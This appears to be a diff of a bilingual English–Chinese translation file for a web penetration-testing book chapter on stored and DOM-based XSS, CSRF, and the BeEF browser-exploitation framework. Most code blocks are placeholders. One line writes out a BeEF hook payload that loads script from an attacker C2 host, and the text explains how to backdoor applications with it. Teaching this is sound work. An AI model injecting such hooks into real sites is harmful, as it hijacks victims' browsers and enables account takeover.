+  zh: 注意
 - en: 'A full explanation of how this clever attack was carried out, including the
     final payload, can be found on Samy Kamkar''s personal site: [https://samy.pl/myspace/tech.html](https://samy.pl/myspace/tech.html).'
+  id: totrans-89
   prefs: []
   type: TYPE_NORMAL
+  zh: 关于该精心设计的攻击是如何执行的、包括最终的负载等完整解释，可以在Samy Kamkar的个人网站找到：[https://samy.pl/myspace/tech.html](https://samy.pl/myspace/tech.html)。
 - en: While Samy's worm did no real damage to users, similar persistent XSS vulnerabilities
     can be used to attack users en masse, gather session cookies, and target them
     for social engineering. Low-privileged users could potentially attack administrative
     users and escalate privileges by storing XSS code, which is later processed when
     the administrator views the infected page.
+  id: totrans-90
   prefs: []
   type: TYPE_NORMAL
+  zh: 虽然Samy的蠕虫对用户没有造成真正的伤害，但类似的持久XSS漏洞可以用来大规模攻击用户、收集会话cookie，并针对社交工程目标。低权限用户可能会利用存储的XSS代码攻击管理用户并通过后续查看受感染页面时处理的XSS代码来提升权限。
 - en: Discovering stored XSS vulnerabilities can be a bit more challenging, as we
     don't always know where and when the payload will be reflected. This is where
     the OOB vulnerability discovery techniques we covered in previous chapters can
     help.
+  id: totrans-91
   prefs: []
   type: TYPE_NORMAL
+  zh: 发现存储型XSS漏洞可能会更具挑战性，因为我们并不总是知道负载何时何地会被反射。在此，我们在前几章讨论过的OOB漏洞发现技巧可以帮助。
 - en: DOM-based XSS
+  id: totrans-92
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 基于DOM的XSS
 - en: This particular type of XSS attack happens when the application's client-side
     code reads data from the DOM and uses it in an unsafe manner.
+  id: totrans-93
   prefs: []
   type: TYPE_NORMAL
+  zh: 当应用程序的客户端代码从DOM中读取数据并以不安全的方式使用时，就会发生这种特定类型的XSS攻击。
 - en: The DOM is essentially a data structure in the browser memory that contains
     all of the objects in the current page. This includes HTML tags and their properties,
     the document title, the head, the body, and even the URL. JavaScript can interface
     with the DOM and modify, add, or delete almost any part of it, immediately affecting
     the page itself.
+  id: totrans-94
   prefs: []
   type: TYPE_NORMAL
+  zh: DOM本质上是浏览器内存中包含当前页面所有对象的数据结构。这包括HTML标签及其属性、文档标题、头部、主体，甚至URL。JavaScript可以与DOM互动并修改、添加或删除几乎任何部分，立即影响页面本身。
 - en: The best way to illustrate the impact of DOM XSS is with a simple vulnerable
     application.
+  id: totrans-95
   prefs: []
   type: TYPE_NORMAL
+  zh: 最好的方法来说明DOM XSS的影响是通过一个简单易受攻击的应用程序。
 - en: 'In the following screenshot, we have some JavaScript code that will welcome
     a user to the page:'
+  id: totrans-96
   prefs: []
   type: TYPE_NORMAL
+  zh: 在以下截图中，我们有一些JavaScript代码，将欢迎*用户*来到页面：
 - en: '![DOM-based XSS](graphics/B09238_09_04.jpg)'
+  id: totrans-97
   prefs: []
   type: TYPE_IMG
+  zh: '![基于DOM的XSS](graphics/B09238_09_04.jpg)'
 - en: 'Figure 9.4: A sample page vulnerable to DOM XSS'
+  id: totrans-98
   prefs: []
   type: TYPE_NORMAL
+  zh: 图9.4：一个易受DOM XSS攻击的示例页面
 - en: This application will scan the document URL for the position of the `name` parameter
     using the `document.URL.indexOf()` function. It will then grab the text starting
     just after `name=` using the `document.URL.substring()` function and store the
     value in the `name` variable.
+  id: totrans-99
   prefs: []
   type: TYPE_NORMAL
+  zh: 该应用程序将扫描文档URL以查找`name`参数的位置，使用`document.URL.indexOf()`函数。然后，它将使用`document.URL.substring()`函数从`name=`后面开始抓取文本，并将值存储在`name`变量中。
 - en: On line 11, the application will walk the DOM for the `span` element `welcome`.
     Line 12 is where the magic happens, also known as the sink. The application will
     fill the contents of the `span` element with that of the `name` URL parameter
     fetched earlier, using the `innerHTML` property of the `welcome` object.
+  id: totrans-100
   prefs: []
   type: TYPE_NORMAL
+  zh: 在第11行，应用程序将遍历DOM以查找`span`元素`welcome`。第12行是魔术发生的地方，也称为漏洞。应用程序将使用`welcome`对象的`innerHTML`属性，将`span`元素的内容填充为之前获取的`name`
+    URL参数的内容。
 - en: 'We can see the intended functionality of the application in the following figure:'
+  id: totrans-101
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们可以在以下图中看到应用程序的预期功能：
 - en: '![DOM-based XSS](graphics/B09238_09_05.jpg)'
+  id: totrans-102
   prefs: []
   type: TYPE_IMG
+  zh: '![基于DOM的XSS](graphics/B09238_09_05.jpg)'
 - en: 'Figure 9.5: The DOM is updated to include the name from the URL'
+  id: totrans-103
   prefs: []
   type: TYPE_NORMAL
+  zh: 图9.5：DOM已更新以包含来自URL的名称
 - en: The `span` element in the DOM was updated with the value passed via the URL
     and everything looks good. The application provides dynamic page content without
     the need for server-side programming.
+  id: totrans-104
   prefs: []
   type: TYPE_NORMAL
+  zh: DOM中的`span`元素已经使用通过URL传递的值进行了更新，一切看起来都很好。应用程序提供了动态页面内容，无需服务器端编程。
 - en: The XSS vulnerability exists because we are able to pass in arbitrary values
     via the URL, which will be reflected in the DOM. The application parses the URL
     and fills in the `welcome` element without sanitizing the input, allowing us to
     insert something other than a name and to potentially execute more JavaScript
     code.
+  id: totrans-105
   prefs: []
   type: TYPE_NORMAL
+  zh: XSS漏洞存在的原因是我们能够通过URL传入任意值，这将反映在DOM中。应用程序解析URL并填充`welcome`元素而不对输入进行消毒，允许我们插入除名称以外的内容，并潜在地执行更多的JavaScript代码。
 - en: 'This attack is similar to your typical reflected XSS, with an important difference:
     the JavaScript code is not reflected by the server code, instead, it is populated
     by the client code. The web server will still see the payload in the request and
     any web application firewalls could still potentially block our attack by dropping
     the connection, but any application input sanitization will have no effect here.'
+  id: totrans-106
   prefs: []
   type: TYPE_NORMAL
+  zh: 这种攻击类似于您典型的反射型XSS，但有一个重要的区别：JavaScript代码不是由服务器代码反射的，而是由客户端代码填充的。Web服务器仍然会在请求中看到有效负载，任何Web应用程序防火墙仍然可能通过断开连接来阻止我们的攻击，但任何应用程序输入消毒在这里都不会起作用。
 - en: Another issue with this particular piece of code is that the URL `GET` parameters
     are not safely parsed. It uses string functions to walk the entire URL and fetch
     arbitrary data.
+  id: totrans-107
   prefs: []
   type: TYPE_NORMAL
+  zh: 这段代码的另一个问题是URL的`GET`参数没有被安全解析。它使用字符串函数遍历整个URL并获取任意数据。
 - en: If we're constructing a malicious URL, we don't actually need to use the question
     mark (`?`) to delimit parameters. We can instead use the hash character (`#`).
     This is referred to as the location hash and yes, it is part of the DOM, accessible
@@ -526,80 +759,117 @@
     us the advantage of not submitting our payload to the server, bypassing the web
     application firewall or server-side XSS filters altogether, while still being
     able to execute JavaScript code.
+  id: totrans-108
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果我们构造一个恶意的URL，实际上不需要使用问号（`?`）来分隔参数。我们可以使用井号（`#`）代替。这被称为位置哈希，是DOM的一部分，可以通过JavaScript访问。浏览器不会将哈希数据与HTTP请求一起发送。这使我们有优势，不需要将我们的有效负载提交给服务器，完全绕过Web应用程序防火墙或服务器端XSS过滤器，同时仍然能够执行JavaScript代码。
 - en: 'Our payload URL to exploit this DOM XSS will look like this:'
+  id: totrans-109
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们用于利用这种DOM XSS的有效负载URL如下所示：
 - en: '[PRE5]'
+  id: totrans-110
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE5]'
 - en: 'The application client-side code works just fine and inserts our XSS payload
     right into the DOM:'
+  id: totrans-111
   prefs: []
   type: TYPE_NORMAL
+  zh: 应用程序客户端代码运行良好，并将我们的XSS有效负载直接插入DOM中：
 - en: '![DOM-based XSS](graphics/B09238_09_06.jpg)'
+  id: totrans-112
   prefs: []
   type: TYPE_IMG
+  zh: '![基于DOM的XSS](graphics/B09238_09_06.jpg)'
 - en: 'Figure 9.6: DOM-based XSS successfully executing'
+  id: totrans-113
   prefs: []
   type: TYPE_NORMAL
+  zh: 图9.6：成功执行基于DOM的XSS
 - en: 'If we inspect the application server log, we can see that our payload was never
     sent over the wire:'
+  id: totrans-114
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果我们检查应用程序服务器日志，我们会发现我们的有效负载从未通过网络发送：
 - en: '[PRE6]'
+  id: totrans-115
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE6]'
 - en: While this attack resulted in the execution of the same JavaScript payload,
     the fact that network and server-side controls cannot defend against these attacks
     makes DOM XSS unique. Being able to leverage the location hash to send our payload
     gives us an advantage over the defenders, as they will not only be powerless to
     stop the attack with compensating server-side controls, but they will not even
     be able to see the payload.
+  id: totrans-116
   prefs: []
   type: TYPE_NORMAL
+  zh: 尽管这次攻击导致了相同的 JavaScript 负载的执行，但是网络和服务器端的控制无法防御这些攻击，这使得 DOM XSS 独特。能够利用位置哈希来发送我们的负载使我们比较有优势，因为防御者不仅无法通过补偿性的服务器端控制来阻止攻击，甚至无法看到负载。
 - en: CSRF
+  id: totrans-117
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: CSRF
 - en: Earlier, I briefly mentioned that browsers will pass along all associated cookies
     to applications automatically. For example, if the user has authenticated to the
     `http://email.site` application, a session cookie will be created, which can be
     used to make authenticated requests. A CSRF attack takes advantage of this user
     experience feature to abuse overly-trusting applications.
+  id: totrans-118
   prefs: []
   type: TYPE_NORMAL
+  zh: 我之前简要提到过浏览器会自动传递所有相关的 cookie 给应用程序。例如，如果用户已经在`http://email.site`应用程序进行了身份验证，将会创建一个会话
+    cookie，可以用来进行经过身份验证的请求。CSRF 攻击利用了这一用户体验功能来滥用过于信任的应用程序。
 - en: It is common for applications to allow users to update their profile with custom
     values that are passed via `GET` or `POST` requests. The application will, of
     course, check to see whether the request is authenticated and perhaps even sanitize
     the input to prevent SQLi or XSS attacks.
+  id: totrans-119
   prefs: []
   type: TYPE_NORMAL
+  zh: 应用程序通常允许用户通过`GET`或`POST`请求传递自定义值来更新其个人资料。当然，应用程序会检查请求是否经过身份验证，甚至可能会对输入进行清理以防止
+    SQLi 或 XSS 攻击。
 - en: Consider a scenario where we've tricked the victim into visiting a malicious
     site, or perhaps we've embedded some JavaScript code in a known-good site. This
     particular piece of code is designed to perform a CSRF attack and target the `http://email.site`
     application.
+  id: totrans-120
   prefs: []
   type: TYPE_NORMAL
+  zh: 想象一种情景，我们已经成功诱使受害者访问了一个恶意网站，或者我们在一个已知良好的网站中嵌入了一些 JavaScript 代码。这段代码旨在执行 CSRF
+    攻击并针对`http://email.site`应用程序。
 - en: 'As attackers, we''ve done some digging and realized that the email application
     provides a way to update the password recovery email through the profile page:
     `http://email.site/profile/`.'
+  id: totrans-121
   prefs: []
   type: TYPE_NORMAL
+  zh: 作为攻击者，我们进行了一些调查，发现电子邮件应用程序通过个人资料页面提供了更新密码恢复电子邮件的方法：`http://email.site/profile/`。
 - en: 'When we submit a change on our own test account, we notice the following URL
     being called:'
+  id: totrans-122
   prefs: []
   type: TYPE_NORMAL
+  zh: 当我们在自己的测试账户上提交更改时，我们注意到以下 URL 被调用：
 - en: '[PRE7]'
+  id: totrans-123
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE7]'
 - en: If we're able to modify another user's password recovery email, we can reset
     their credentials and potentially login as that user. This is where a CSRF attack
     comes into play. While the application does validate the email address value and
     the request must be authenticated, there are no other security checks.
+  id: totrans-124
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果我们能够修改另一个用户的密码恢复电子邮件，我们就可以重置他们的凭据，甚至可能以该用户身份登录。这就是 CSRF 攻击发挥作用的地方。虽然应用程序会验证电子邮件地址值并且请求必须经过身份验证，但没有其他安全检查。
 - en: A CSRF attack embeds an invisible `iframe`, `img`, or similar element in a malicious
     site, which makes a cross-origin request to the target application using attacker-supplied
     values. When the victim's browser attempts to load the `iframe` or `img` element,
@@ -607,27 +877,40 @@
     point of view, this is a valid request and it is allowed to execute. Attackers
     may not be able to read the response, since it is made cross-origin (remember
     SOP?) but the damage has already been done.
+  id: totrans-125
   prefs: []
   type: TYPE_NORMAL
+  zh: CSRF 攻击在恶意网站中嵌入一个不可见的`iframe`、`img`或类似元素，通过攻击者提供的值向目标应用程序发起跨源请求。当受害者的浏览器尝试加载`iframe`或`img`元素时，它也会传递会话
+    cookie。从应用程序的角度来看，这是一个有效的请求，允许执行。攻击者可能无法读取响应，因为它是跨源的（记得 SOP 吗？），但损害已经造成。
 - en: In our malicious site, we embed an `img` tag with the source pointing to the
     profile update URL containing our email address as the new value.
+  id: totrans-126
   prefs: []
   type: TYPE_NORMAL
+  zh: 在我们的恶意网站中，我们嵌入了一个指向包含我们电子邮件地址作为新值的个人资料更新 URL 的`img`标签。
 - en: 'A typical CSRF attack flows something like the following:'
+  id: totrans-127
   prefs: []
   type: TYPE_NORMAL
+  zh: 典型的 CSRF 攻击流程如下：
 - en: '![CSRF](graphics/B09238_09_07.jpg)'
+  id: totrans-128
   prefs: []
   type: TYPE_IMG
+  zh: '![CSRF](graphics/B09238_09_07.jpg)'
 - en: 'Figure 9.7: CSRF attack flow'
+  id: totrans-129
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 9.7：CSRF 攻击流程
 - en: When the user visits our malicious site, the image will attempt to load by making
     an authenticated `GET` request to the target application, updating the recovery
     email for the victim on the email application. We now have the ability to request
     a password reset for the victim's account and login to the email site directly.
+  id: totrans-130
   prefs: []
   type: TYPE_NORMAL
+  zh: 当用户访问我们的恶意网站时，图片将尝试通过发出经过身份验证的 `GET` 请求来加载目标应用程序，更新受害者的电子邮件应用程序中的恢复电子邮件。现在我们有能力请求受害者账户的密码重置，并直接登录到电子邮件网站。
 - en: To prevent CSRF attacks, developers should implement **CSRF tokens**. These
     are unique, one-time numbers (**nonces**) generated for every request to a protected
     page. When a request to update any part of the application is made, the client
@@ -635,92 +918,133 @@
     to change. Theoretically, attackers embedding `img` tags in their own malicious
     site would have no way of guessing this particular token, therefore CSRF attacks
     would fail.
+  id: totrans-131
   prefs: []
   type: TYPE_NORMAL
+  zh: 为了防止 CSRF 攻击，开发人员应该实现**CSRF 令牌**。这些是为每个受保护页面的请求生成的唯一、一次性数字（**nonce**）。当发出更新应用程序任何部分的请求时，客户端必须在请求之前发送这个唯一的值，才能允许数据发生更改。从理论上讲，攻击者将
+    `img` 标签嵌入自己恶意网站中时，无法猜测这个特定的令牌，因此 CSRF 攻击会失败。
 - en: CSRF tokens are a good defense against CSRF, if implemented properly. First
     of all, the value should be unique, non-deterministic, and hard to guess. A small
     random integer does not make a good token because it can easily be brute-forced.
     An MD5 hash of the username or any other static guessable value is not good enough
     either.
+  id: totrans-132
   prefs: []
   type: TYPE_NORMAL
+  zh: CSRF 令牌是防御 CSRF 攻击的有效手段，如果正确实施。首先，令牌的值应该是唯一的、非确定性的并且难以猜测。一个小的随机整数并不是一个好的令牌，因为它很容易被暴力破解。使用用户名或任何其他静态可猜测的值生成的
+    MD5 哈希值也不足够好。
 - en: CSRF tokens should be tied to the user session and if that session is destroyed,
     the tokens should go with it. If tokens are global, attackers can generate them
     on their own accounts and use them to target others.
+  id: totrans-133
   prefs: []
   type: TYPE_NORMAL
+  zh: CSRF 令牌应该与用户会话绑定，如果会话被销毁，令牌也应该随之消失。如果令牌是全局的，攻击者可以在自己的账户上生成它们，并用来攻击其他用户。
 - en: CSRF tokens should also be time-limited. After a reasonable amount of time,
     the token should expire and should never come up again. If tokens are passed via
     `GET` requests, they might be cached by proxies or the browser, and attackers
     can simply harvest old values and reuse them.
+  id: totrans-134
   prefs: []
   type: TYPE_NORMAL
+  zh: CSRF 令牌也应该是时间限制的。在合理的时间内，令牌应该过期，并且不应再出现。如果令牌通过 `GET` 请求传递，它们可能会被代理或浏览器缓存，攻击者可以简单地收集旧的令牌值并重复使用它们。
 - en: When we encounter CSRF tokens in a target application, we should check for issues
     with the implementation. You'd be surprised how many times the CSRF token is issued
     but ignored when passed back to the server.
+  id: totrans-135
   prefs: []
   type: TYPE_NORMAL
+  zh: 当我们在目标应用程序中遇到 CSRF 令牌时，我们应该检查实现中是否存在问题。你会惊讶于很多情况下，CSRF 令牌被发出但在返回服务器时被忽视。
 - en: CSRF is an interesting vulnerability that can often be chained together with
     other issues, such as XSS, to perform an effective attack against a particular
     target.
+  id: totrans-136
   prefs: []
   type: TYPE_NORMAL
+  zh: CSRF 是一种有趣的漏洞，通常可以与其他问题（如 XSS）联动，执行有效的攻击，针对特定目标。
 - en: Say we had discovered a stored XSS vulnerability in the profile page of the
     email application. We could update our name to reflect some XSS payload. Since
     we cannot affect other users' profile names, this XSS payload would only really
     trigger for our account. This is referred to as **self-XSS**. If the same application
     is also vulnerable to CSRF attacks on both the login and logout pages, we could
     force a user to logout and also force them to login as somebody else.
+  id: totrans-137
   prefs: []
   type: TYPE_NORMAL
+  zh: 假设我们在电子邮件应用程序的个人资料页面中发现了一个存储型 XSS 漏洞。我们可以更新我们的名称，反映某些 XSS 有效载荷。由于我们无法影响其他用户的个人资料名称，因此这个
+    XSS 有效载荷只会在我们的账户中触发。这被称为**自我 XSS**。如果同一应用程序在登录和注销页面上也容易受到 CSRF 攻击，我们可以强制用户注销，并强制他们以其他身份登录。
 - en: 'First of all, we would submit an XSS payload into our own profile name and
     save it for later. Then, we could build a malicious site that performs the following
     operations in order:'
+  id: totrans-138
   prefs: []
   type: TYPE_NORMAL
+  zh: 首先，我们会将 XSS 有效载荷提交到我们自己的个人资料名称中，并保存以便以后使用。然后，我们可以构建一个恶意网站，按以下顺序执行以下操作：
 - en: Uses CSRF to force the victim to logout of the application
+  id: totrans-139
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 使用 CSRF 强制受害者注销应用程序
 - en: Uses CSRF to log the victim back in using our credentials
+  id: totrans-140
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 使用 CSRF 利用我们的凭据将受害者重新登录
 - en: Uses CSRF to navigate to the application profile page containing the self-XSS payload
+  id: totrans-141
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 使用 CSRF 导航到包含自我 XSS 有效载荷的应用程序个人资料页面
 - en: Executes the XSS payload on the victim's browser
+  id: totrans-142
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 在受害者的浏览器上执行 XSS 有效载荷
 - en: 'The malicious code would look something like this:'
+  id: totrans-143
   prefs: []
   type: TYPE_NORMAL
+  zh: 恶意代码看起来大致如下：
 - en: '![CSRF](graphics/B09238_09_08.jpg)'
+  id: totrans-144
   prefs: []
   type: TYPE_IMG
+  zh: '![CSRF](graphics/B09238_09_08.jpg)'
 - en: 'Figure 9.8: Malicious self-XSS and CSRF attack code'
+  id: totrans-145
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 9.8：恶意自XSS和CSRF攻击代码
 - en: The `http://email.site/profile/` contains the self-XSS code we stored earlier,
     which would execute on the unsuspecting target once the `iframe` loads.
+  id: totrans-146
   prefs: []
   type: TYPE_NORMAL
+  zh: '`http://email.site/profile/`包含我们之前存储的自XSS代码，一旦`iframe`加载，代码将在毫无戒备的目标上执行。'
 - en: What can we do with JavaScript code running in the victim's browser, but under
     our account session? It doesn't make sense to steal session cookies, but we have
     other options, as we will see next.
+  id: totrans-147
   prefs: []
   type: TYPE_NORMAL
+  zh: 当我们在受害者的浏览器中运行JavaScript代码，并且该代码是在我们的账户会话下执行时，我们能做什么？窃取会话Cookies没有意义，但我们有其他的选项，正如我们接下来所见。
 - en: BeEF
+  id: totrans-148
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: BeEF
 - en: An XSS vulnerability is difficult to exploit successfully in most circumstances.
     When I'm talking about practical client-side attacks, I don't mean taking a screenshot
     of the `alert(1)` popup window for the report!
+  id: totrans-149
   prefs: []
   type: TYPE_NORMAL
+  zh: XSS漏洞在大多数情况下很难成功利用。当我谈论实际的客户端攻击时，我不是指为报告拍摄`alert(1)`弹出窗口的截图！
 - en: During an engagement, the XSS vulnerability may be a viable way to attack users
     and gain a foothold on the network. Conducting XSS attacks can be difficult, as,
     in most cases, you only have one shot at it. We need to execute code and do everything
@@ -728,184 +1052,271 @@
     token or other sensitive data is easy enough, but what if we want to take our
     attack to the next level? Ideally, we want to take full control of the browser
     and have it do our bidding, perhaps automating some more advanced attacks.
+  id: totrans-150
   prefs: []
   type: TYPE_NORMAL
+  zh: 在渗透测试过程中，XSS漏洞可能是攻击用户并获得网络立足点的有效途径。进行XSS攻击可能会很困难，因为在大多数情况下，你只有一次机会。我们需要在用户关闭浏览器会话之前执行代码并完成所有操作。提取会话令牌或其他敏感数据很容易，但如果我们想将攻击提升到下一个层级该怎么办？理想情况下，我们希望完全控制浏览器，让它为我们所用，或许还能自动化一些更高级的攻击。
 - en: BeEF is a great tool that was created by Wade Alcorn to allow for the easy exploitation
     of XSS vulnerabilities.
+  id: totrans-151
   prefs: []
   type: TYPE_NORMAL
+  zh: BeEF是Wade Alcorn创建的一个很棒的工具，旨在简化XSS漏洞的利用。
 - en: 'BeEF has a server component that provides command and control. Clients, or
     zombies, are hooked using a JavaScript snippet hosted on the C2 server itself.
     The zombie will check in periodically with the C2 server and receive commands,
     which can include:'
+  id: totrans-152
   prefs: []
   type: TYPE_NORMAL
+  zh: BeEF有一个提供指挥与控制的服务器组件。客户端或僵尸通过托管在C2服务器上的JavaScript代码片段被钩住。僵尸会定期与C2服务器联系，并接收指令，这些指令可能包括：
 - en: Executing arbitrary JavaScript code
+  id: totrans-153
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 执行任意JavaScript代码
 - en: Social engineering to deliver malware
+  id: totrans-154
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 社会工程学投递恶意软件
 - en: Persistence
+  id: totrans-155
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 持久性
 - en: Metasploit integration
+  id: totrans-156
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: Metasploit集成
 - en: Information gathering
+  id: totrans-157
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 信息收集
 - en: …and much more
+  id: totrans-158
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: …以及更多
 - en: To exploit a client with BeEF, we'd have to hook it using an XSS attack or by
     backdooring an application's client code. The JavaScript payload would execute
     and load the hook from our BeEF C2, giving us access to execute more code packaged
     inside BeEF as commands.
+  id: totrans-159
   prefs: []
   type: TYPE_NORMAL
+  zh: 为了利用BeEF攻击客户端，我们必须通过XSS攻击或通过给应用程序客户端代码植入后门来钩住它。JavaScript有效载荷将执行并从我们的BeEF C2加载钩子，从而让我们能够执行作为命令打包在BeEF中的更多代码。
 - en: Note
+  id: totrans-160
   prefs:
   - PREF_H3
   type: TYPE_NORMAL
+  zh: 注意
 - en: 'Installing BeEF is straightforward and it is available on GitHub: [https://github.com/beefproject/beef](https://github.com/beefproject/beef).
     BeEF is also installed on Kali Linux by default. Although, in some cases, it''s
     better to have it running in your C2 server in the cloud.'
+  id: totrans-161
   prefs: []
   type: TYPE_NORMAL
+  zh: 安装BeEF非常简单，并且它可以在GitHub上获取：[https://github.com/beefproject/beef](https://github.com/beefproject/beef)。BeEF在Kali
+    Linux上也默认安装了。尽管在某些情况下，将其部署在云中的C2服务器上运行会更好。
 - en: 'We can clone the latest version from the GitHub repository using the `git clone`
     command:'
+  id: totrans-162
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们可以使用`git clone`命令从GitHub仓库克隆最新版本：
 - en: '[PRE8]'
+  id: totrans-163
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE8]'
 - en: 'The source comes with an `install` script, which will setup the environment
     for us. Inside the `beef` folder, execute the `install` script:'
+  id: totrans-164
   prefs: []
   type: TYPE_NORMAL
+  zh: 源代码附带一个`install`脚本，该脚本将为我们设置环境。在`beef`文件夹中，执行`install`脚本：
 - en: '[PRE9]'
+  id: totrans-165
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE9]'
 - en: 'BeEF can be fine-tuned using the YAML configuration file, `config.yaml`. There
     are lots of options to tweak but for us, but the most important are the following:'
+  id: totrans-166
   prefs: []
   type: TYPE_NORMAL
+  zh: BeEF可以通过YAML配置文件`config.yaml`进行微调。虽然有很多选项可以调整，但对我们来说，最重要的选项如下：
 - en: '[PRE10]'
+  id: totrans-167
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE10]'
 - en: The root of the configuration file is `beef` with indented lines delimiting
     subnodes. For example, the path `beef.credentials.user` path would return the
     `admin` value once the configuration file is parsed.
+  id: totrans-168
   prefs: []
   type: TYPE_NORMAL
+  zh: 配置文件的根节点是`beef`，缩进行限定子节点。例如，路径`beef.credentials.user`在解析配置文件后会返回`admin`值。
 - en: Changing the `beef.credentials.*` options should be a no-brainer. Updating the
     `beef.restrictions.*` options is also recommended, to ensure we target the appropriate
     clients and to keep unauthorized users out of the C2 interface.
+  id: totrans-169
   prefs: []
   type: TYPE_NORMAL
+  zh: 更改 `beef.credentials.*` 选项应该是显而易见的。还建议更新 `beef.restrictions.*` 选项，以确保我们只针对合适的客户端并将未授权用户排除在
+    C2 界面之外。
 - en: The `permitted_ui_subnet` option will limit which network ranges BeEF will allow access
     to `/ui/`, the C2 administrative interface. This should be very restrictive, so
     you would typically set it to your current external address followed by `/32`.
+  id: totrans-170
   prefs: []
   type: TYPE_NORMAL
+  zh: '`permitted_ui_subnet` 选项将限制 BeEF 允许访问 `/ui/`（C2 管理界面）的网络范围。这个设置应该非常严格，因此通常将其设置为当前的外部地址，后跟
+    `/32`。'
 - en: We can also limit the addresses that are actually allowed to interact with BeEF's
     hook, preventing any unwanted clients from being exploited. If we are running
     BeEF internally, we can limit the hooking subnet to, say, marketing only. If analysts
     from the blue team segment attempt to run the hook payload, they won't get anything
     useful back.
+  id: totrans-171
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们还可以限制实际允许与 BeEF 钩子互动的地址，防止任何不需要的客户端被利用。如果我们在内部运行 BeEF，可以将钩子子网限制为，例如，仅限市场部门。如果蓝队分析人员尝试运行钩子负载，他们将无法获取任何有用的信息。
 - en: For production deployments in the cloud, we need to set `beef.http.host` to
     our target's IP address space and we also want to listen on port `443`. Running
     BeEF with `beef.https.enable = true` is recommended, as it increases the chances
     of success when hooking.
+  id: totrans-172
   prefs: []
   type: TYPE_NORMAL
+  zh: 对于云端的生产部署，我们需要将 `beef.http.host` 设置为目标的 IP 地址范围，并且我们还希望监听端口 `443`。推荐使用 `beef.https.enable
+    = true` 来运行 BeEF，因为这会增加钩子成功的概率。
 - en: If we attempt to inject our BeEF payload `<script async src=http://c2.spider.ml/hook.js>`
     into a page loaded over HTTPS, modern browsers will not load the script at all.
     Loading HTTPS resources in an HTTP site is allowed, so, if possible, C2 should
     always be running with TLS enabled.
+  id: totrans-173
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果我们尝试将 BeEF 负载 `<script async src=http://c2.spider.ml/hook.js>` 注入一个通过 HTTPS
+    加载的页面，现代浏览器将根本不会加载该脚本。允许在 HTTP 网站加载 HTTPS 资源，因此，如果可能，C2 应始终启用 TLS 运行。
 - en: The `beef.https.key` and `beef.https.cert` configuration options should point
     to the appropriate certificate, hopefully, signed by a trusted root certificate
     authority such as **Let's Encrypt**. We've covered using Let's Encrypt to request
     free certificates for use in our C2 infrastructure, in [Chapter 6](ch06.html "Chapter 6. Out-of-Band
     Exploitation"), *Out-of-Band Exploitation*.
+  id: totrans-174
   prefs: []
   type: TYPE_NORMAL
+  zh: '`beef.https.key` 和 `beef.https.cert` 配置选项应指向适当的证书，最好是由受信任的根证书颁发机构签署的证书，如 **Let''s
+    Encrypt**。我们在 [第 6 章](ch06.html "第 6 章。带外利用")《带外利用》中介绍了如何使用 Let''s Encrypt 请求免费的证书来用于我们的
+    C2 基础设施。'
 - en: Note
+  id: totrans-175
   prefs:
   - PREF_H3
   type: TYPE_NORMAL
+  zh: 注意
 - en: Let's Encrypt provides free domain-validated certificates for hostnames and
     even wildcards. More information can be found at [https://letsencrypt.org/](https://letsencrypt.org/).
+  id: totrans-176
   prefs: []
   type: TYPE_NORMAL
+  zh: Let's Encrypt 提供免费的域名验证证书，支持主机名和通配符证书。更多信息请访问 [https://letsencrypt.org/](https://letsencrypt.org/)。
 - en: The `beef.http.public` value should match the HTTPS certificate domain or you may
     have client validation errors and the hook will fail.
+  id: totrans-177
   prefs: []
   type: TYPE_NORMAL
+  zh: '`beef.http.public` 的值应与 HTTPS 证书的域名匹配，否则可能会出现客户端验证错误，钩子将无法成功。'
 - en: 'Once everything is configured, we can launch the server component:'
+  id: totrans-178
   prefs: []
   type: TYPE_NORMAL
+  zh: 配置完成后，我们可以启动服务器组件：
 - en: '![BeEF](graphics/B09238_09_09.jpg)'
+  id: totrans-179
   prefs: []
   type: TYPE_IMG
+  zh: '![BeEF](graphics/B09238_09_09.jpg)'
 - en: 'Figure 9.9: BeEF running in the cloud'
+  id: totrans-180
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 9.9：BeEF 在云端运行
 - en: With the BeEF C2 server up and running on `c2.spider.ml`, we can start attacking
     clients. The first step is to get the BeEF hook code to execute in the target
     browser. There are a few ways to accomplish this, the more common being a persistent,
     reflected or DOM-based XSS attack.
+  id: totrans-181
   prefs: []
   type: TYPE_NORMAL
+  zh: 在 `c2.spider.ml` 上运行 BeEF C2 服务器后，我们可以开始攻击客户端。第一步是让 BeEF 钩子代码在目标浏览器中执行。有几种方法可以实现这一点，最常见的是持久性、反射型或基于
+    DOM 的 XSS 攻击。
 - en: If we have shell access to the application, there is also value in backdooring
     application code with a BeEF hook. We can persist our hook code and record user activities,
     and even use social engineering to execute malware on high-value targets' machines.
+  id: totrans-182
   prefs: []
   type: TYPE_NORMAL
